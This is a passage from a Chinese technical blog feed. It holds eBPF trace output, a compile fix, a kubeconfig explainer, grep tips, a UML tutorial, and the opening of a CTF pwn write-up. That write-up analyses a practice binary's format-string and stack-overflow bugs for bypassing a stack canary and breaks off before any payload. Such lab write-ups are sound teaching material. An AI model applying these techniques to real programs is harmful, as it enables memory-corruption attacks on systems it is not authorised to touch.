dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x21&#125;, &#123;code=BPF_STX|BPF_H|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-4, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x646c726f&#125;, &#123;code=BPF_STX|BPF_W|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-8, imm=0&#125;, &#123;code=BPF_LD|BPF_DW|BPF_IMM, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x6c6c6548&#125;, &#123;code=BPF_LD|BPF_W|BPF_IMM, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x57202c6f&#125;, &#123;code=BPF_STX|BPF_DW|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-16, imm=0&#125;, &#123;code=BPF_ALU64|BPF_X|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_10, off=0, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_ADD, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0xfffffff0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_2, src_reg=BPF_REG_0, off=0, imm=0xe&#125;, &#123;code=BPF_JMP|BPF_K|BPF_CALL, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x6&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;, &#123;code=BPF_JMP|BPF_K|BPF_EXIT, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;], license=<span class="hljs-string">&quot;GPL&quot;</span>, log_level=0, log_size=0, log_buf=NULL, kern_version=KERNEL_VERSION(5, 15, 74), prog_flags=0, prog_name=<span class="hljs-string">&quot;hello_world&quot;</span>, prog_ifindex=0, expected_attach_type=BPF_CGROUP_INET_INGRESS, prog_btf_fd=3, func_info_rec_size=8, func_info=0x55cd34bb8700, func_info_cnt=1, line_info_rec_size=16, line_info=0x55cd34b42800, line_info_cnt=5, attach_btf_id=0, attach_prog_fd=0, fd_array=NULL&#125;, 128) = 4<br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.168992: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169022: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169047: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169050: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006685: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006702: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193472: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193486: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193711: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193712: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193806: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193807: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193900: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193902: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257082: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257119: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506782: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506819: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757435: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757476: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006600: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006637: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.203999: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204040: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204324: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204347: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204729: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.205191: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.205215: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] d...1 27979.212232: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] dN..1 27979.212317: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257070: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257121: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257315: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257323: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257356: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257357: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257426: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257428: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257496: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257497: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257515: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257516: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257626: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257627: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257699: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257700: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257717: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257732: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257733: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257748: bpf_trace_printk: Hello, World!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【ebpf】编译</title>
    <link href="/2023/10/31/ebpf/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/"/>
    <url>/2023/10/31/ebpf/%E3%80%90ebpf%E3%80%91%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-147-generic <span class="hljs-comment">#164~18.04.1-Ubuntu SMP Tue Apr 4 00:20:20 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br><span class="hljs-comment"># cat /etc/os-release</span><br>NAME=<span class="hljs-string">&quot;Ubuntu&quot;</span><br>VERSION=<span class="hljs-string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span><br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=<span class="hljs-string">&quot;Ubuntu 18.04.6 LTS&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;18.04&quot;</span><br>HOME_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://help.ubuntu.com/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br>PRIVACY_POLICY_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br>VERSION_CODENAME=bionic<br>UBUNTU_CODENAME=bionic<br><br></code></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># clang -O2 -g -target bpf -c bpf_sockops.c -o bpf_sockops.o</span><br>In file included from bpf_sockops.c:1:<br>In file included from /usr/include/linux/bpf.h:11:<br>/usr/include/linux/types.h:5:10: fatal error: <span class="hljs-string">&#x27;asm/types.h&#x27;</span> file not found<br><span class="hljs-comment">#include &lt;asm/types.h&gt;</span><br>         ^~~~~~~~~~~~~<br>1 error generated.<br><br></code></pre></td></tr></table></figure><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># apt-get install -y gcc-multilib</span><br></code></pre></td></tr></table></figure><h2 id="参卡"><a href="#参卡" class="headerlink" title="参卡"></a>参卡</h2><p><a href="https://www.ghl.name/archives/how-to-fix-asm-types-h-no-found.html"># Debian下libbpf编译失败提示&lt;asm&#x2F;types.h&gt;文件不存在解决方法</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】todo(202305) kubeconfig文件</title>
    <link href="/2023/10/31/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/"/>
    <url>/2023/10/31/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91todo(202305)%20kubeconfig%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>在Kubernetes中，kubeconfig是用于指定如何连接到Kubernetes集群的配置文件。kubeconfig包含了以下信息：</p><ol><li>Kubernetes API服务器的地址和访问凭据（用户名和密码、客户端证书和私钥等）。</li><li>用于授权访问Kubernetes API的凭据（例如，Token、BasicAuth等）。</li><li>Kubernetes集群的CA（证书颁发机构）证书，用于验证API服务器的TLS证书。</li></ol><p>kubeconfig中的证书包括客户端证书和CA证书。客户端证书用于对与Kubernetes API服务器的通信进行身份验证，它通常由CA证书签发。CA证书用于验证Kubernetes API服务器的TLS证书，以确保与服务器之间的通信是安全的。在kubeconfig中配置正确的客户端证书和CA证书可以确保与Kubernetes API服务器的连接是安全的，并且只有授权用户才能访问集群资源。</p><p>Kubernetes使用TLS来保护API服务器和各个组件之间的通信。客户端证书和CA证书都是X.509格式的数字证书，用于验证和加密这些通信。因此，在kubeconfig中正确配置这些证书是确保Kubernetes集群安全性的关键之一。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202307) 常用命令：grep</title>
    <link href="/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Agrep/"/>
    <url>/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Agrep/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># grep如何查找两个字符串</span><br><span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;xxxx&quot;</span> | grep -E <span class="hljs-string">&quot;thb7r|6rgl8&quot;</span><br><br><br><span class="hljs-comment"># grep 如何获取以aaa开头的字符串</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;aaa123\nbbb456\n789aaa\naaa789\nccc012&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;aaa123\nbbb456\n789aaa\naaa789\nccc012&quot;</span> | grep <span class="hljs-string">&quot;^aaa&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202307)常用命令：doc2unix</title>
    <link href="/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adoc2unix/"/>
    <url>/2023/10/31/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202307)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Adoc2unix/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【EnterpriseArchitect】小案例-图书管理系统</title>
    <link href="/2023/09/20/tools/%E3%80%90EnterpriseArchitect%E3%80%91%E5%B0%8F%E6%A1%88%E4%BE%8B-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/09/20/tools/%E3%80%90EnterpriseArchitect%E3%80%91%E5%B0%8F%E6%A1%88%E4%BE%8B-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920094652.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920094737.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920094757.png" alt="image.png"></p><p>可以发现，有箭头了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095218.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095642.png" alt="image.png"></p><h2 id="活动图"><a href="#活动图" class="headerlink" title="活动图"></a>活动图</h2><p>可以在这个地方的借书直接建图，也可以和业务建模平行建立一个需求建模，下面为第一种方式</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095907.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920095954.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920101848.png" alt="image.png"></p><h2 id="分析建模"><a href="#分析建模" class="headerlink" title="分析建模"></a>分析建模</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920102652.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920103253.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920103351.png" alt="image.png"></p><h2 id="设计建模"><a href="#设计建模" class="headerlink" title="设计建模"></a>设计建模</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920104716.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920104829.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920104918.png" alt="image.png"></p><p>选择“Package”<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920105147.png" alt="image.png"></p><p>依赖关系，一般表现为传参</p><h2 id="组合结构图"><a href="#组合结构图" class="headerlink" title="组合结构图"></a>组合结构图</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920110246.png" alt="image.png"></p><p>拖一个管理员进来</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920111027.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920111127.png" alt="image.png"></p><h2 id="顺序图"><a href="#顺序图" class="headerlink" title="顺序图"></a>顺序图</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920112154.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920112249.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920114143.png" alt="image.png"></p><p>变成这样子了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920114203.png" alt="image.png"></p><p>下面这个圈住的意思是：当满足条件时，调用某个方法，创建后面那个对象<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920115308.png" alt="image.png"></p><h2 id="通信图"><a href="#通信图" class="headerlink" title="通信图"></a>通信图</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920141543.png" alt="image.png"></p><h2 id="部署图"><a href="#部署图" class="headerlink" title="部署图"></a>部署图</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920145216.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920145511.png" alt="image.png"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230920172008.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】pwn类型 canary</title>
    <link href="/2023/09/04/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91pwn%E7%B1%BB%E5%9E%8B%20canary/"/>
    <url>/2023/09/04/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91pwn%E7%B1%BB%E5%9E%8B%20canary/</url>
    
    <content type="html"><![CDATA[<h1 id="01-格式化字符串-32位程序"><a href="#01-格式化字符串-32位程序" class="headerlink" title="01 格式化字符串 (32位程序)"></a>01 格式化字符串 (32位程序)</h1><h2 id="checksec查看"><a href="#checksec查看" class="headerlink" title="checksec查看"></a>checksec查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># file bin</span><br>bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=01c7b75be8e31b585bf8739665273c91584b826e, not stripped<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># checksec --file=bin</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/01/bin&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># ./bin</span><br>%7<span class="hljs-variable">$p</span><br>0xda44e500123456<br><br></code></pre></td></tr></table></figure><p>checksec查看发现：32位程序，有canary</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904220846.png" alt="image.png"></p><h2 id="分析漏洞函数"><a href="#分析漏洞函数" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><p>从ida中查看，分析漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp+6h] [ebp-12h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  init();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  fun();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现上面的main函数中存在格式化字符串漏洞，可以利用该漏洞泄露出canary的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>fun函数中，有一个栈溢出的漏洞，可以构造payload进行栈溢出，返回地址填充成什么呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get flag error&quot;</span>);<br>  fgets(s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方看到有一个后门函数，直接返回到这个函数位置即可~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904221307.png" alt="image.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; =============== S U B R O U T I N E =======================================<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; Attributes: bp-based frame<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; unsigned <span class="hljs-type">int</span> getflag()<br>.text:<span class="hljs-number">0804863</span>B                               <span class="hljs-built_in">public</span> getflag<br>.text:<span class="hljs-number">0804863</span>B                               getflag proc near<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               stream= dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0804863</span>B                               s= byte ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0804863</span>B                               var_C= dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0804863</span>B<br>.text:<span class="hljs-number">0804863</span>B                               ; __unwind &#123;<br>.text:<span class="hljs-number">0804863</span>B <span class="hljs-number">55</span>                            push    ebp<br></code></pre></td></tr></table></figure><p>看到后门函数为cat .&#x2F;flag，所以在同级目录下加个一个flag文件，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/01]<br>└─<span class="hljs-comment"># cat flag</span><br>flag123<br></code></pre></td></tr></table></figure><h2 id="如何泄露canary地址-如何寻找变量和ebp之间的偏移"><a href="#如何泄露canary地址-如何寻找变量和ebp之间的偏移" class="headerlink" title="如何泄露canary地址 + 如何寻找变量和ebp之间的偏移"></a>如何泄露canary地址 + 